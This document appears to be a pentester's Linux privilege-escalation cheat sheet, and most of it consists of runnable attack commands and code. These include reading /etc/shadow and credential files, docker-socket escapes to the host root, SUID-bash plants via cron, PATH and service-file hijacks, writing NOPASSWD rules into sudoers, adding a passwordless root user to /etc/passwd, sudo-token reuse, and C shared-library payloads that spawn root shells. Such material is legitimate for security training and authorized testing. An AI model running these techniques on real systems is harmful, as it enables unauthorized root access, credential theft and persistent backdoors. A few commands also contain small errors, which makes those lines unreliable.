Linux Privilege Escalation

System Information

Env info

Interesting information, passwords or API keys in the environment
variables?

    (env || set) 2>/dev/null

Sudo version

Based on the vulnerable sudo versions that appear in:

    searchsploit sudo

You can check if the sudo version is vulnerable using this grep.

    sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"

sudo < v1.28

From @sickrov

    sudo -u#-1 /bin/bash

Docker Breakout

Drives

Check what is mounted and unmounted, where and why. If anything is
unmounted you could try to mount it and check for private info

    ls /dev 2>/dev/null | grep -i "sd"
    cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
    #Check if credentials in fstab
    grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null

Useful software

Enumerate useful binaries

    which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null

Also, check if any compiler is installed. This is useful if you need to
use some kernel exploit as it’s recommended to compile it in the machine
where you are going to use it (or in one similar)

    (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")

Vulnerable Software Installed

Check for the version of the installed packages and services. Maybe
there is some old Nagios version (for example) that could be exploited
for escalating privileges…
It is recommended to check manually the version of the more suspicious
installed software.

    dpkg -l #Debian
    rpm -qa #Centos

Processes

Take a look at what processes are being executed and check if any
process has more privileges than it should (maybe a tomcat being
executed by root?)

    ps aux
    ps -ef
    top -n 1

Scheduled/Cron jobs

Check if any scheduled job is vulnerable. Maybe you can take advantage
of a script being executed by root (wildcard vuln? can modify files that
root uses? use symlinks? create specific files in the directory that
root uses?).

    crontab -l
    ls -al /etc/cron* /etc/at*
    cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"

Cron path

For example, inside /etc/crontab you can find the PATH:
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

(Note how the user “user” has writing privileges over /home/user)

If inside this crontab the root user tries to execute some command or
script without setting the path. For example: * * * * root overwrite.sh
Then, you can get a root shell by using:

    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
    #Wait cron job to be executed
    /tmp/bash -p #The effective uid and gid to be set to the real uid and gid

Cron using a script with a wildcard (Wildcard Injection)

If a script is executed by root has a “*” inside a command, you could
exploit this to make unexpected things (like privesc). Example:

    rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script

If the wildcard is preceded of a path like /some/path/* , it’s not
vulnerable (even ./* is not).

Read the following page for more wildcard exploitation tricks:

{% content-ref url=“wildcards-spare-tricks.md” %}
wildcards-spare-tricks.md {% endcontent-ref %}

Cron script overwriting and symlink

If you can modify a cron script executed by root, you can get a shell
very easily:

    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
    #Wait until it is executed
    /tmp/bash -p

If the script executed by root uses a directory where you have full
access, maybe it could be useful to delete that folder and create a
symlink folder to another one serving a script controlled by you

    ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>

Frequent cron jobs

You can monitor the processes to search for processes that are being
executed every 1, 2 or 5 minutes. Maybe you can take advantage of it and
escalate privileges.

For example, to monitor every 0.1s during 1 minute, sort by less
executed commands and delete the commands that have been executed the
most, you can do:

    for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;

You can also use pspy (this will monitor and list every process that
starts).

Invisible cron jobs

It’s possible to create a cronjob putting a carriage return after a
comment (without newline character), and the cron job will work. Example
(note the carriage return char):

    #This is a comment inside a cron config file\r* * * * * echo "Surprise!"

Services

Writable .service files

Check if you can write any .service file, if you can, you could modify
it so it executes your backdoor when the service is started, restarted
or stopped (maybe you will need to wait until the machine is rebooted).
For example create your backdoor inside the .service file with
ExecStart=/tmp/script.sh

Writable service binaries

Keep in mind that if you have write permissions over binaries being
executed by services, you can change them for backdoors so when the
services get re-executed the backdoors will be executed.

systemd PATH - Relative Paths

You can see the PATH used by systemd with:

    systemctl show-environment

If you find that you can write in any of the folders of the path you may
be able to escalate privileges. You need to search for relative paths
being used on service configurations files like:

    ExecStart=faraday-server
    ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
    ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"

Then, create an executable with the same name as the relative path
binary inside the systemd PATH folder you can write, and when the
service is asked to execute the vulnerable action (Start, Stop, Reload),
your backdoor will be executed (unprivileged users usually cannot
start/stop services but check if you can use sudo -l).

Learn more about services with man systemd.service.

Timers

Timers are systemd unit files whose name ends in **.timer** that control
**.service** files or events. Timers can be used as an alternative to
cron as they have built-in support for calendar time events and
monotonic time events and can be run asynchronously.

You can enumerate all the timers with:

    systemctl list-timers --all

Writable timers

If you can modify a timer you can make it execute some existents of
systemd.unit (like a .service or a .target)

    Unit=backdoor.service

In the documentation you can read what the Unit is:

  The unit to activate when this timer elapses. The argument is a unit
  name, whose suffix is not “.timer”. If not specified, this value
  defaults to a service that has the same name as the timer unit, except
  for the suffix. (See above.) It is recommended that the unit name that
  is activated and the unit name of the timer unit are named
  identically, except for the suffix.

Therefore, to abuse this permission you would need to:

-   Find some systemd unit (like a .service) that is executing a
    writable binary
-   Find some systemd unit that is executing a relative path and you
    have writable privileges over the systemd PATH (to impersonate that
    executable)

Learn more about timers with man systemd.timer.

Enabling Timer

To enable a timer you need root privileges and to execute:

    sudo systemctl enable backu2.timer
    Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.

Note the timer is activated by creating a symlink to it on
/etc/systemd/system/<WantedBy_section>.wants/<name>.timer

Sockets

In brief, a Unix Socket (technically, the correct name is Unix Domain
Socket, UDS) allows communication between two different processes on
either the same machine or different machines in client-server
application frameworks. To be more precise, it’s a way of communicating
among computers using a standard Unix descriptors file. (From here).

Sockets can be configured using .socket files.

Learn more about sockets with man systemd.socket. Inside this file,
several interesting parameters can be configured:

-   ListenStream, ListenDatagram, ListenSequentialPacket, ListenFIFO,
    ListenSpecial, ListenNetlink, ListenMessageQueue, ListenUSBFunction:
    These options are different but a summary is used to indicate where
    it is going to listen to the socket (the path of the AF_UNIX socket
    file, the IPv4/6 and/or port number to listen, etc.)
-   Accept: Takes a boolean argument. If true, a service instance is
    spawned for each incoming connection and only the connection socket
    is passed to it. If false, all listening sockets themselves are
    passed to the started service unit, and only one service unit is
    spawned for all connections. This value is ignored for datagram
    sockets and FIFOs where a single service unit unconditionally
    handles all incoming traffic. Defaults to false. For performance
    reasons, it is recommended to write new daemons only in a way that
    is suitable for Accept=no.
-   ExecStartPre, ExecStartPost: Takes one or more command lines, which
    are executed before or after the listening sockets/FIFOs are created
    and bound, respectively. The first token of the command line must be
    an absolute filename, then followed by arguments for the process.
-   ExecStopPre, ExecStopPost: Additional commands that are executed
    before or after the listening sockets/FIFOs are closed and removed,
    respectively.
-   Service: Specifies the service unit name to activate on incoming
    traffic. This setting is only allowed for sockets with Accept=no. It
    defaults to the service that bears the same name as the socket (with
    the suffix replaced). In most cases, it should not be necessary to
    use this option.

Writable .socket files

If you find a writable .socket file you can add at the beginning of the
[Socket] section something like: ExecStartPre=/home/kali/sys/backdoor
and the backdoor will be executed before the socket is created.
Therefore, you will probably need to wait until the machine is rebooted.
Note that the system must be using that socket file configuration or the
backdoor won’t be executed

Writable sockets

If you identify any writable socket (now we are talking about Unix
Sockets and not about the config .socket files), then you can
communicate with that socket and maybe exploit a vulnerability.

Enumerate Unix Sockets

    netstat -a -p --unix

Writable Docker Socket

The docker socket is typically located at /var/run/docker.sock and is
only writable by the root user and docker group.
If for some reason you have write permissions over that socket you can
escalate privileges.
The following commands can be used to escalate privileges:

    docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
    docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh

Use docker web API from socket without docker package

If you have access to docker socket but you can’t use the docker binary
(maybe it isn’t even installed), you can use the web API directly with
curl.

The following commands are an example of how to create a docker
container that mounts the root of the host system and use socat to
execute commands into the new docker.

    # List docker images
    curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
    #[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
    # Send JSON to docker API to create the container
    curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
    #{"Id":"<NewContainerID>","Warnings":[]}
    curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start

The last step is to use socat to initiate a connection to the container,
sending an “attach” request

    socat - UNIX-CONNECT:/var/run/docker.sock
    POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
    Host:
    Connection: Upgrade
    Upgrade: tcp

    #HTTP/1.1 101 UPGRADED
    #Content-Type: application/vnd.docker.raw-stream
    #Connection: Upgrade
    #Upgrade: tcp

Now, you can execute commands on the container from this socat
connection.

Others

Note that if you have write permissions over the docker socket because
you are inside the group docker you have more ways to escalate
privileges. If the docker API is listening in a port you can also be
able to compromise it.

Check more ways to break out from docker or abuse it to escalate
privileges in:

{% content-ref url=“docker-security/” %} docker-security {%
endcontent-ref %}

Containerd (ctr) privilege escalation

If you find that you can use the ctr command read the following page as
you may be able to abuse it to escalate privileges:

{% content-ref url=“containerd-ctr-privilege-escalation.md” %}
containerd-ctr-privilege-escalation.md {% endcontent-ref %}

RunC privilege escalation

If you find that you can use the runc command read the following page as
you may be able to abuse it to escalate privileges:

{% content-ref url=“runc-privilege-escalation.md” %}
runc-privilege-escalation.md {% endcontent-ref %}

Network

It’s always interesting to enumerate the network and figure out the
position of the machine.

Generic enumeration

    #Hostname, hosts and DNS
    cat /etc/hostname /etc/hosts /etc/resolv.conf
    dnsdomainname

    #Content of /etc/inetd.conf & /etc/xinetd.conf
    cat /etc/inetd.conf /etc/xinetd.conf

    #Interfaces
    cat /etc/networks
    (ifconfig || ip a)

    #Neighbours
    (arp -e || arp -a)
    (route || ip n)

    #Iptables rules
    (timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

    #Files used by network services
    lsof -i

Open ports

Always check network services running on the machine that you weren’t
able to interact with before accessing it:

    (netstat -punta || ss --ntpu)
    (netstat -punta || ss --ntpu) | grep "127.0"

Users

Generic Enumeration

Check who you are, which privileges do you have, which users are in the
systems, which ones can login and which ones have root privileges:

    #Info about me
    id || (whoami && groups) 2>/dev/null
    #List all users
    cat /etc/passwd | cut -d: -f1
    #List users with console
    cat /etc/passwd | grep "sh$"
    #List superusers
    awk -F: '($3 == "0") {print}' /etc/passwd
    #Currently logged users
    w
    #Login history
    last | tail
    #Last log of each user
    lastlog

    #List all users and their groups
    for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
    #Current user PGP keys
    gpg --list-keys 2>/dev/null

Big UID

Some Linux versions were affected by a bug that allows users with UID >
INT_MAX to escalate privileges. More info: here, here and here.
Exploit it using: systemd-run -t /bin/bash

Groups

Check if you are a member of some group that could grant you root
privileges:

{% content-ref url=“interesting-groups-linux-pe/” %}
interesting-groups-linux-pe {% endcontent-ref %}

Known passwords

If you know any password of the environment try to login as each user
using the password.

Su Brute

If don’t mind about doing a lot of noise and su and timeout binaries are
present on the computer, you can try to brute-force user using
su-bruteforce.
Linpeas with -a parameter also try to brute-force users.

Writable PATH abuses

$PATH

If you find that you can write inside some folder of the $PATH you may
be able to escalate privileges by creating a backdoor inside the
writable folder with the name of some command that is going to be
executed by a different user (root ideally) and that is not loaded from
a folder that is located previous to your writable folder in $PATH.

SUDO and SUID

You could be allowed to execute some command using sudo or they could
have the suid bit. Check it using:

    sudo -l #Check commands you can execute with sudo
    find / -perm -4000 2>/dev/null #Find all SUID binaries

Some unexpected commands allow you to read and/or write files or even
execute a command. For example:

    sudo awk 'BEGIN {system("/bin/sh")}'
    sudo find /etc -exec sh -i \;
    sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
    sudo tar c a.tar -I ./runme.sh a
    ftp>!/bin/sh
    less>! <shell_comand>

NOPASSWD

Sudo configuration might allow a user to execute some command with
another user’s privileges without knowing the password.

    $ sudo -l
    User demo may run the following commands on crashlab:
        (root) NOPASSWD: /usr/bin/vim

In this example the user demo can run vim as root, it is now trivial to
get a shell by adding an ssh key into the root directory or by calling
sh.

    sudo vim -c '!sh'

SETENV

This directive allows the user to set an environment variable while
executing something:

    $ sudo -l
    User waldo may run the following commands on admirer:
        (ALL) SETENV: /opt/scripts/admin_tasks.sh

This example, based on HTB machine Admirer, was vulnerable to PYTHONPATH
hijacking to load an arbitrary python library while executing the script
as root:

    sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh

Sudo execution bypassing paths

Jump to read other files or use symlinks. For example in sudoers file:
hacker10 ALL= (root) /bin/less /var/log/*

    sudo less /var/logs/anything
    less>:e /etc/shadow #Jump to read other files using privileged less

    ln /etc/shadow /var/log/new
    sudo less /var/log/new #Use symlinks to read any file

If a wildcard is used (*), it is even easier:

    sudo less /var/log/../../etc/shadow #Read shadow
    sudo less /var/log/something /etc/shadow #Red 2 files

Countermeasures:
https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/

Sudo command/SUID binary without command path

If the sudo permission is given to a single command without specifying
the path: hacker10 ALL= (root) less you can exploit it by changing the
PATH variable

    export PATH=/tmp:$PATH
    #Put your backdoor in /tmp and name it "less"
    sudo less

This technique can also be used if a suid binary executes another
command without specifying the path to it (always check with strings the
content of a weird SUID binary).

Payload examples to execute.

SUID binary with command path

If the suid binary executes another command specifying the path, then,
you can try to export a function named as the command that the suid file
is calling.

For example, if a suid binary calls /usr/sbin/service apache2 start you
have to try to create the function and export it:

    function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
    export -f /usr/sbin/service

Then, when you call the suid binary, this function will be executed

LD_PRELOAD & LD_LIBRARY_PATH

LD_PRELOAD is an optional environmental variable containing one or more
paths to shared libraries, or shared objects, that the loader will load
before any other shared library including the C runtime library
(libc.so) This is called preloading a library.

To avoid this mechanism being used as an attack vector for suid/sgid
executable binaries, the loader ignores LD_PRELOAD if ruid != euid. For
such binaries, only libraries in standard paths that are also suid/sgid
will be preloaded.

If you find inside the output of sudo -l the sentence:
env_keep+=LD_PRELOAD and you can call some command with sudo, you can
escalate privileges.

    Defaults        env_keep += LD_PRELOAD

Save as /tmp/pe.c

    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>

    void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
    }

Then compile it using:

    cd /tmp
    gcc -fPIC -shared -o pe.so pe.c -nostartfiles

Finally, escalate privileges running

    sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo

{% hint style=“danger” %} A similar privesc can be abused if the
attacker controls the LD_LIBRARY_PATH env variable because he controls
the path where libraries are going to be searched. {% endhint %}

    #include <stdio.h>
    #include <stdlib.h>

    static void hijack() __attribute__((constructor));

    void hijack() {
            unsetenv("LD_LIBRARY_PATH");
            setresuid(0,0,0);
            system("/bin/bash -p");
    }

    # Compile & execute
    cd /tmp
    gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
    sudo LD_LIBRARY_PATH=/tmp <COMMAND>

SUID Binary – .so injection

If you find some weird binary with SUID permissions, you could check if
all the .so files are loaded correctly. To do so you can execute:

    strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"

For example, if you find something like:
pen(“/home/user/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file
or directory) you can exploit it.

Create the file /home/user/.config/libcalc.c with the code:

    #include <stdio.h>
    #include <stdlib.h>

    static void inject() __attribute__((constructor));

    void inject(){
        system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
    }

Compile it using:

    gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c

And execute the binary.

Shared Object Hijacking

    # Lets find a SUID using a non-standard library
    ldd some_suid
    something.so => /lib/x86_64-linux-gnu/something.so

    # The SUID also loads libraries from a custom location where we can write
    readelf -d payroll  | grep PATH
    0x000000000000001d (RUNPATH)            Library runpath: [/development]

Now that we have found a SUID binary loading a library from a folder
where we can write, lets create the library in that folder with the
necessary name:

    //gcc src.c -fPIC -shared -o /development/libshared.so
    #include <stdio.h>
    #include <stdlib.h>

    static void hijack() __attribute__((constructor));

    void hijack() {
            setresuid(0,0,0);
            system("/bin/bash -p");
    }

If you get an error such as

    ./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name

that means that the library you have generated need to have a function
called a_function_name.

GTFOBins

GTFOBins is a curated list of Unix binaries that can be exploited by an
attacker to bypass local security restrictions. GTFOArgs is the same but
for cases where you can only inject arguments in a command.

The project collects legitimate functions of Unix binaries that can be
abused to break out restricted shells, escalate or maintain elevated
privileges, transfer files, spawn bind and reverse shells, and
facilitate the other post-exploitation tasks.

  gdb -nx -ex ‘!sh’ -ex quit
  sudo mysql -e ‘! /bin/sh’
  strace -o /dev/null /bin/sh
  sudo awk ‘BEGIN {system(“/bin/sh”)}’

{% embed url=“https://gtfobins.github.io/” %}

{% embed url=“https://gtfoargs.github.io/” %}

FallOfSudo

If you can access sudo -l you can use the tool FallOfSudo to check if it
finds how to exploit any sudo rule.

Reusing Sudo Tokens

In the scenario where you have a shell as a user with sudo privileges
but you don’t know the password of the user, you can wait for him/her to
execute some command using sudo. Then, you can access the token of the
session where sudo was used and use it to execute anything as sudo
(privilege escalation).

Requirements to escalate privileges:

-   You already have a shell as user “sampleuser”
-   “sampleuser” have used sudo to execute something in the last 15mins
    (by default that’s the duration of the sudo token that allows us to
    use sudo without introducing any password)
-   cat /proc/sys/kernel/yama/ptrace_scope is 0
-   gdb is accessible (you can be able to upload it)

(You can temporarily enable ptrace_scope with
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope or permanently
modifying /etc/sysctl.d/10-ptrace.conf and setting
kernel.yama.ptrace_scope = 0)

If all these requirements are met, you can escalate privileges using:
https://github.com/nongiach/sudo_inject

-   The first exploit (exploit.sh) will create the binary
    activate_sudo_token in /tmp. You can use it to activate the sudo
    token in your session (you won’t get automatically a root shell, do
    sudo su):

    bash exploit.sh
    /tmp/activate_sudo_token
    sudo su

-   The second exploit (exploit_v2.sh) will create a sh shell in /tmp
    owned by root with setuid

    bash exploit_v2.sh
    /tmp/sh -p

-   The third exploit (exploit_v3.sh) will create a sudoers file that
    makes sudo tokens eternal and allows all users to use sudo

    bash exploit_v3.sh
    sudo su

/var/run/sudo/ts/<Username>

If you have write permissions in the folder or on any of the created
files inside the folder you can use the binary write_sudo_token to
create a sudo token for a user and PID.
For example, if you can overwrite the file /var/run/sudo/ts/sampleuser
and you have a shell as that user with PID 1234, you can obtain sudo
privileges without needing to know the password doing:

    ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser

/etc/sudoers, /etc/sudoers.d

The file /etc/sudoers and the files inside /etc/sudoers.d configure who
can use sudo and how. These files by default can only be read by user
root and group root.
If you can read this file you could be able to obtain some interesting
information, and if you can write any file you will be able to escalate
privileges.

    ls -l /etc/sudoers /etc/sudoers.d/
    ls -ld /etc/sudoers.d/

If you can write you can abuse this permission

    echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
    echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README

Another way to abuse these permissions:

    # makes it so every terminal can sudo  
    echo "Defaults !tty_tickets" > /etc/sudoers.d/win
    # makes it so sudo never times out
    echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win

Sudo Hijacking

If you know that a user usually connects to a machine and uses sudo to
escalate privileges and you got a shell within that user context, you
can create a new sudo executable that will execute your code as root and
then the user’s command. Then, modify the $PATH of the user context (for
example adding the new path in .bash_profile) so when the user executes
sudo, your sudo executable is executed.

Note that if the user uses a different shell (not bash) you will need to
modify other files to add the new path. For examplesudo-piggyback
modifies ~/.bashrc, ~/.zshrc, ~/.bash_profile. You can find another
example in bashdoor.py

Shared Library

ld.so

The file /etc/ld.so.conf indicates where the loaded configurations files
are from. Typically, this file contains the following path:
include /etc/ld.so.conf.d/*.conf

That means that the configuration files from /etc/ld.so.conf.d/*.conf
will be read. This configuration files points to other folders where
libraries are going to be searched for. For example, the content of
/etc/ld.so.conf.d/libc.conf is /usr/local/lib. This means that the
system will search for libraries inside /usr/local/lib.

If for some reason a user has write permissions on any of the paths
indicated: /etc/ld.so.conf, /etc/ld.so.conf.d/, any file inside
/etc/ld.so.conf.d/ or any folder within the config file inside
/etc/ld.so.conf.d/*.conf he may be able to escalate privileges.
Take a look at how to exploit this misconfiguration in the following
page:

{% content-ref url=“ld.so.conf-example.md” %} ld.so.conf-example.md {%
endcontent-ref %}

RPATH

    level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
     0x00000001 (NEEDED)                     Shared library: [libc.so.6]
     0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

    level15@nebula:/home/flag15$ ldd ./flag15
     linux-gate.so.1 =>  (0x0068c000)
     libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
     /lib/ld-linux.so.2 (0x005bb000)

By copying the lib into /var/tmp/flag15/ it will be used by the program
in this place as specified in the RPATH variable.

    level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

    level15@nebula:/home/flag15$ ldd ./flag15
     linux-gate.so.1 =>  (0x005b0000)
     libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
     /lib/ld-linux.so.2 (0x00737000)

Then create an evil library in /var/tmp with
gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6

    #include<stdlib.h>
    #define SHELL "/bin/sh"

    int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
    {
     char *file = SHELL;
     char *argv[] = {SHELL,0};
     setresuid(geteuid(),geteuid(), geteuid());
     execve(file,argv,0);
    }

Capabilities

Linux capabilities provide a subset of the available root privileges to
a process. This effectively breaks up root privileges into smaller and
distinctive units. Each of these units can then be independently granted
to processes. This way the full set of privileges is reduced, decreasing
the risks of exploitation.
Read the following page to learn more about capabilities and how to
abuse them:

{% content-ref url=“linux-capabilities.md” %} linux-capabilities.md {%
endcontent-ref %}

Directory permissions

In a directory, the bit for “execute” implies that the user affected can
“cd” into the folder.
The “read” bit implies the user can list the files, and the “write” bit
implies the user can delete and create new files.

ACLs

ACLs (Access Control Lists) are the second level of discretionary
permissions, that may override the standard ugo/rwx ones. When used
correctly they can grant you a better granularity in setting access to a
file or a directory, for example by giving or denying access to a
specific user that is neither the file owner nor the group owner (from
here).
Give user “kali” read and write permissions over a file:

    setfacl -m u:kali:rw file.txt
    #Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

    setfacl -b file.txt #Remove the ACL of the file

Get files with specific ACLs from the system:

    getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null

SSH

SSH Interesting configuration values

-   PasswordAuthentication: Specifies whether password authentication is
    allowed. The default is no.
-   PubkeyAuthentication: Specifies whether public key authentication is
    allowed. The default is yes.
-   PermitEmptyPasswords: When password authentication is allowed, it
    specifies whether the server allows login to accounts with empty
    password strings. The default is no.

PermitRootLogin

Specifies whether root can log in using ssh, default is no. Possible
values:

-   yes: root can login using password and private key
-   without-password or prohibit-password: root can only login with a
    private key
-   forced-commands-only: Root can login only using private key and if
    the commands options are specified
-   no : no

AuthorizedKeysFile

Specifies files that contain the public keys that can be used for user
authentication. It can contain tokens like %h, which will be replaced by
the home directory. You can indicate absolute paths (starting in /) or
relative paths from the user’s home. For example:

    AuthorizedKeysFile    .ssh/authorized_keys access

That configuration will indicate that if you try to login with the
private key of the user “testusername” ssh is going to compare the
public key of your key with the ones located in
/home/testusername/.ssh/authorized_keys and /home/testusername/access

ForwardAgent/AllowAgentForwarding

SSH agent forwarding allows you to use your local SSH keys instead of
leaving keys (without passphrases!) sitting on your server. So, you will
be able to jump via ssh to a host and from there jump to another host
using the key located in your initial host.

You need to set this option in $HOME/.ssh.config like this:

    Host example.com
      ForwardAgent yes

Notice that if Host is * every time the user jumps to a different
machine, that host will be able to access the keys (which is a security
issue).

The file /etc/ssh_config can override this options and allow or denied
this configuration.
The file /etc/sshd_config can allow or denied ssh-agent forwarding with
the keyword AllowAgentForwarding (default is allow).

If you find that Forward Agent is configured in an environment read the
following page as you may be able to abuse it to escalate privileges:

{% content-ref url=“ssh-forward-agent-exploitation.md” %}
ssh-forward-agent-exploitation.md {% endcontent-ref %}

Interesting Files

Profiles files

The file /etc/profile and the files under /etc/profile.d/ are scripts
that are executed when a user runs a new shell. Therefore, if you can
write or modify any of them you can escalate privileges.

    ls -l /etc/profile /etc/profile.d/

If any weird profile script is found you should check it for sensitive
details.

Passwd/Shadow Files

Depending on the OS the /etc/passwd and /etc/shadow files may be using a
different name or there may be a backup. Therefore it’s recommended find
all of them and check if you can read them to see if there are hashes
inside the files:

    #Passwd equivalent files
    cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
    #Shadow equivalent files
    cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null

In some occasions you can find password hashes inside the /etc/passwd
(or equivalent) file

    grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null

Writable /etc/passwd

First, generate a password with one of the following commands.

    openssl passwd -1 -salt hacker hacker
    mkpasswd -m SHA-512 hacker
    python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'

Then add the user hacker and add the generated password.

    hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash

E.g: hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash

You can now use the su command with hacker:hacker

Alternatively, you can use the following lines to add a dummy user
without a password.
WARNING: you might degrade the current security of the machine.

    echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
    su - dummy

NOTE: In BSD platforms /etc/passwd is located at /etc/pwd.db and
/etc/master.passwd, also the /etc/shadow is renamed to /etc/spwd.db.

You should check if you can write in some sensitive files. For example,
can you write to some service configuration file?

    find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
    for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user

For example, if the machine is running a tomcat server and you can
modify the Tomcat service configuration file inside /etc/systemd/, then
you can modify the lines:

    ExecStart=/path/to/backdoor
    User=root
    Group=root

Your backdoor will be executed the next time that tomcat is started.

Check Folders

The following folders may contain backups or interesting information:
/tmp, /var/tmp, /var/backups, /var/mail, /var/spool/mail, /etc/exports,
/root (Probably you won’t be able to read the last one but try)

    ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root

Weird Location/Owned files

    #root owned files in /home folders
    find /home -user root 2>/dev/null
    #Files owned by other users in folders owned by me
    for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
    #Files owned by root, readable by me but not world readable
    find / -type f -user root ! -perm -o=r 2>/dev/null
    #Files owned by me or world writable
    find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
    #Writable files by each group I belong to
    for g in `groups`;
          do printf "  Group $g:\n";
          find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
          done
    done

Modified files in last mins

    find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null

*_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

    find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null

